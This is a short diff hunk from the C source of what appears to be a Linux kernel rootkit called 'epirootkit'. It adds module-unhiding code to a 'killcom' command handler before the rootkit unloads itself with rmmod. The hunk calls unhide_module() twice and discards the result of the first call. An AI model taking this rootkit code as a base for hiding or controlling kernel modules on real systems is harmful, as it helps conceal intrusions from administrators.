@@ -257,6 +257,14 @@ static int killcom_handler(char *args) {
     static char *argv[] = { "/usr/sbin/rmmod", "epirootkit", NULL };
     static char *envp[] = { "HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
 
+    // Unhiding module...
+    unhide_module();
+    int ret_code = unhide_module();
+    if (ret_code < 0) {
+        ERR_MSG("unhide_module_handler: failed to unhide module\n");
+        return ret_code;
+    }
+
     DBG_MSG("killcom_handler: calling rmmod from usermode...\n");
 
     call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
